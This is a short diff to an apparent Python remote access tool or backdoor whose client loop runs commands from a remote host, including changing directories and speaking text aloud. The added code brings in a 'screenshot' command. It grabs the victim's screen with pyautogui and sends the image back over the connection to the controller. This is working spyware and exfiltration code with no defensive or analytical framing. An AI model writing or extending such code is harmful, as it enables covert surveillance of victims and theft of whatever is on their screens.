@@ -1,5 +1,7 @@
+import io
 import os
 import pyttsx3
+import pyautogui
 import subprocess
 import helpers as hlp
 from termcolor import cprint
@@ -39,6 +41,11 @@ def run(host, port):
                         except FileNotFoundError:
                             client.send('Directory non valida\n')
                         continue
+                    elif cmd == 'screenshot':
+                        pil_img = pyautogui.screenshot()
+                        img_bytes = io.BytesIO()
+                        pil_img.save(img_bytes, format='PNG')
+                        client.send_file(data=img_bytes.getvalue(), filename='buda_screenshot.png')
                     elif cmd.startswith('speak'):
                         try:
                             engine.say(cmd.removeprefix('speak').lstrip())
